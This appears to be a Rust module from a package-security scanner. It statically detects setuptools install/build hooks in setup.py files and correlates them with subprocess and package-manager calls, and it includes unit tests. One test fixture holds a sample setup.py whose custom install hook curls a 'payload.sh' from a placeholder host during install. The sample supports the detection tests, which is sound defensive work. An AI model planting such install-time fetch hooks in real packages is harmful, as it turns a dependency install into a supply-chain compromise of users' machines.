//! Semantic analysis of `setup.py` install/build hooks.
//!
//! `setup.py` is never executed. This module reuses the semantic
//! Python engine (`crate::python_static`) for the generic capability findings
//! (`LF-CODE-SUBPROCESS` etc.) that already fire on any `.py` file, and adds
//! setuptools-specific structure on top: classes that subclass
//! `distutils`/`setuptools` `Command` (or one of its common subclasses)
//! define code that runs during package install/build, before a reviewer
//! would normally inspect runtime application code.
//!
//! Base-class recognition is by simple name only (no import resolution): a
//! class named `CustomInstall(install):` is flagged even when `install` is
//! not literally `setuptools.command.install.install`. This is a documented
//! limitation (see `LF-DEP-INSTALL-HOOK` in `explain.rs`), not an oversight.

use crate::finding_evidence::{source_excerpt, EvidenceSubject, FindingBuilder};
use crate::python_static::calls::{CallSite, PythonCapabilityCategory};
use crate::python_static::limits::PythonAnalysisLimits;
use crate::python_static::parser::{parse_python_source, LineIndex};
use crate::scanner::{CheckType, Confidence, FindingClass, LayerScanResult, ScanStatus};
use rustpython_parser::ast::{Expr, Stmt, Suite};
use std::collections::BTreeSet;
use std::time::Instant;

const DEPENDENCY_MEDIA_TYPE: &str = "application/vnd.layerfault.dependency-manifest";

const HOOK_BASE_NAMES: &[&str] = &[
    "Command",
    "build_ext",
    "build_py",
    "install",
    "develop",
    "egg_info",
    "sdist",
    "bdist_wheel",
];

struct HookClass {
    name: String,
    base: String,
    line_start: u64,
    line_end: u64,
}

pub fn analyze_setup_py(
    relative_path: &str,
    source: &str,
    digest: &str,
    auto_map_modules: &BTreeSet<String>,
    started: Instant,
) -> Vec<LayerScanResult> {
    let limits = PythonAnalysisLimits::default();
    let mut out = Vec::new();

    if let Ok(generic) = crate::python_static::analyze_and_convert_findings(
        relative_path,
        source,
        digest,
        auto_map_modules,
        &limits,
        started,
    ) {
        out.extend(generic);
    }

    let parse_res = parse_python_source(source, relative_path, &limits);
    let Some(suite) = &parse_res.ast else {
        return out;
    };
    let line_index = LineIndex::new(source);
    let hook_classes = find_hook_classes(suite, &line_index);
    if hook_classes.is_empty() {
        return out;
    }

    let call_sites: Vec<CallSite> =
        crate::python_static::analyze(relative_path, source, digest, auto_map_modules, &limits)
            .map(|analysis| analysis.call_sites)
            .unwrap_or_default();

    let subject = EvidenceSubject::member(relative_path)
        .with_sha256(Some(digest.to_owned()))
        .with_media_type(DEPENDENCY_MEDIA_TYPE);

    for hook in &hook_classes {
        let capability_sites: Vec<&CallSite> = call_sites
            .iter()
            .filter(|site| {
                site.line.is_some_and(|line| {
                    (line as u64) >= hook.line_start && (line as u64) <= hook.line_end
                })
            })
            .collect();

        let confidence = if capability_sites.is_empty() {
            Confidence::Medium
        } else {
            Confidence::High
        };

        let mut builder = FindingBuilder::new(
            "LF-DEP-INSTALL-HOOK",
            CheckType::PackageSecurity,
            ScanStatus::Warn,
        )
        .class(FindingClass::ContentIndicator)
        .confidence(confidence)
        .digest(digest)
        .media_type(DEPENDENCY_MEDIA_TYPE)
        .subject(subject.clone())
        .detail(format!(
            "'{relative_path}' defines '{}', a custom install/build hook subclassing '{}'; \
                 its code runs during package install or build",
            hook.name, hook.base
        ));

        if capability_sites.is_empty() {
            builder = builder.evidence(source_excerpt(
                subject.clone(),
                hook.line_start,
                hook.line_end,
                &hook.name,
                &format!("class {}({}):", hook.name, hook.base),
            ));
        } else {
            for site in &capability_sites {
                let line = site.line.unwrap_or(hook.line_start as usize) as u64;
                builder = builder.evidence(source_excerpt(
                    subject.clone(),
                    line,
                    line,
                    &site.resolved_target,
                    site.literal_arg_evidence
                        .as_deref()
                        .unwrap_or(&site.resolved_target),
                ));
            }
        }
        out.push(builder.finish());

        for site in &capability_sites {
            if site.category == PythonCapabilityCategory::PackageInstallationCodeAcquisition {
                let line = site.line.unwrap_or(hook.line_start as usize) as u64;
                out.push(
                    FindingBuilder::new(
                        "LF-DEP-RUNTIME-INSTALL",
                        CheckType::PackageSecurity,
                        ScanStatus::Warn,
                    )
                    .class(FindingClass::ContentIndicator)
                    .confidence(Confidence::Medium)
                    .digest(digest)
                    .media_type(DEPENDENCY_MEDIA_TYPE)
                    .subject(subject.clone())
                    .detail(format!(
                        "'{relative_path}' install hook '{}' invokes a package manager ('{}')",
                        hook.name,
                        site.executable_name.as_deref().unwrap_or("<unknown>")
                    ))
                    .evidence(source_excerpt(
                        subject.clone(),
                        line,
                        line,
                        &site.resolved_target,
                        site.literal_arg_evidence
                            .as_deref()
                            .unwrap_or(&site.resolved_target),
                    ))
                    .finish(),
                );
            }
        }
    }

    out
}

fn find_hook_classes(suite: &Suite, line_index: &LineIndex) -> Vec<HookClass> {
    let mut out = Vec::new();
    walk_suite(suite, line_index, &mut out);
    out
}

fn walk_suite(suite: &Suite, line_index: &LineIndex, out: &mut Vec<HookClass>) {
    for stmt in suite {
        match stmt {
            Stmt::ClassDef(class) => {
                for base in &class.bases {
                    if let Some(base_name) = simple_name(base) {
                        if HOOK_BASE_NAMES.contains(&base_name.as_str()) {
                            out.push(HookClass {
                                name: class.name.as_str().to_owned(),
                                base: base_name,
                                line_start: line_index.line_number(usize::from(class.range.start()))
                                    as u64,
                                line_end: line_index.line_number(usize::from(class.range.end()))
                                    as u64,
                            });
                            break;
                        }
                    }
                }
                walk_suite(&class.body, line_index, out);
            }
            Stmt::FunctionDef(f) => walk_suite(&f.body, line_index, out),
            Stmt::AsyncFunctionDef(f) => walk_suite(&f.body, line_index, out),
            Stmt::If(i) => {
                walk_suite(&i.body, line_index, out);
                walk_suite(&i.orelse, line_index, out);
            }
            Stmt::Try(t) => {
                walk_suite(&t.body, line_index, out);
                walk_suite(&t.orelse, line_index, out);
                walk_suite(&t.finalbody, line_index, out);
            }
            _ => {}
        }
    }
}

fn simple_name(expr: &Expr) -> Option<String> {
    match expr {
        Expr::Name(n) => Some(n.id.as_str().to_owned()),
        Expr::Attribute(a) => Some(a.attr.as_str().to_owned()),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn custom_install_hook_with_subprocess_correlates() {
        let code = r#"
import subprocess
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        subprocess.run(["curl", "https://example.com/payload.sh"])
        install.run(self)
"#;
        let auto_map = BTreeSet::new();
        let started = Instant::now();
        let findings = analyze_setup_py("setup.py", code, "sha256:test", &auto_map, started);
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-DEP-INSTALL-HOOK"
                && f.confidence == Confidence::High));
    }

    #[test]
    fn install_hook_without_capability_is_medium_confidence() {
        let code = r#"
from setuptools.command.install import install

class QuietInstall(install):
    def run(self):
        install.run(self)
"#;
        let auto_map = BTreeSet::new();
        let started = Instant::now();
        let findings = analyze_setup_py("setup.py", code, "sha256:test", &auto_map, started);
        let hook = findings
            .iter()
            .find(|f| crate::policy::rule_id(f) == "LF-DEP-INSTALL-HOOK")
            .expect("hook finding");
        assert_eq!(hook.confidence, Confidence::Medium);
    }

    #[test]
    fn plain_setup_py_has_no_hook_finding() {
        let code = "from setuptools import setup\nsetup(name=\"pkg\")\n";
        let auto_map = BTreeSet::new();
        let started = Instant::now();
        let findings = analyze_setup_py("setup.py", code, "sha256:test", &auto_map, started);
        assert!(!findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-DEP-INSTALL-HOOK"));
    }

    #[test]
    fn runtime_install_inside_hook_is_flagged() {
        let code = r#"
import subprocess
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        subprocess.run(["pip", "install", "extra-package"])
        install.run(self)
"#;
        let auto_map = BTreeSet::new();
        let started = Instant::now();
        let findings = analyze_setup_py("setup.py", code, "sha256:test", &auto_map, started);
        assert!(findings
            .iter()
            .any(|f| crate::policy::rule_id(f) == "LF-DEP-RUNTIME-INSTALL"));
    }
}
